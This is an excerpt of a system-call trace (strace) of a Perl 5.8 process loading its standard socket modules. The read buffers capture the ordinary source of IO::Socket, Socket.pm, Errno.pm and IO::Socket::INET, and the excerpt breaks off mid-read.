}\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
12207 20:24:32.713369 stat64("/etc/perl/Socket.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713435 stat64("/etc/perl/Socket.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713473 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713500 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713525 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713553 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713595 stat64("/usr/lib/perl5/Socket.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713624 stat64("/usr/lib/perl5/Socket.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713638 stat64("/usr/share/perl5/Socket.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713649 stat64("/usr/share/perl5/Socket.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713662 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.713675 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
12207 20:24:32.713696 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.713710 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.713721 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.713739 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
12207 20:24:32.714179 brk(0x8239000)    = 0x8239000
12207 20:24:32.714384 read(8, "", 4096) = 0
12207 20:24:32.714400 close(8)          = 0
12207 20:24:32.714486 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12207 20:24:32.714511 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12207 20:24:32.714548 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
12207 20:24:32.714592 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
12207 20:24:32.714705 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12207 20:24:32.714724 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d13000
12207 20:24:32.714737 mmap2(0xb7d18000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d18000
12207 20:24:32.714753 close(8)          = 0
12207 20:24:32.715391 brk(0x825a000)    = 0x825a000
12207 20:24:32.715655 stat64("/etc/perl/Errno.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715673 stat64("/etc/perl/Errno.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715688 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715701 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715728 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715741 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715755 stat64("/usr/lib/perl5/Errno.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715766 stat64("/usr/lib/perl5/Errno.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715779 stat64("/usr/share/perl5/Errno.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715791 stat64("/usr/share/perl5/Errno.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715843 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.715855 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
12207 20:24:32.715877 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.715891 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.715903 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.715922 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
12207 20:24:32.716905 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
12207 20:24:32.717376 _llseek(8, 5966, [5966], SEEK_SET) = 0
12207 20:24:32.717394 _llseek(8, 0, [5966], SEEK_CUR) = 0
12207 20:24:32.717404 close(8)          = 0
12207 20:24:32.717799 brk(0x827b000)    = 0x827b000
12207 20:24:32.717925 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
12207 20:24:32.718405 _llseek(6, 6698, [6698], SEEK_SET) = 0
12207 20:24:32.718421 _llseek(6, 0, [6698], SEEK_CUR) = 0
12207 20:24:32.718432 close(6)          = 0
12207 20:24:32.718451 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.718466 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.718480 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.718498 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.718513 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.718526 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.718540 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.718552 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.718566 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.718578 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.718599 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.718642 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
12207 20:24:32.718681 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:32.718696 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.718708 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:32.718725 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return 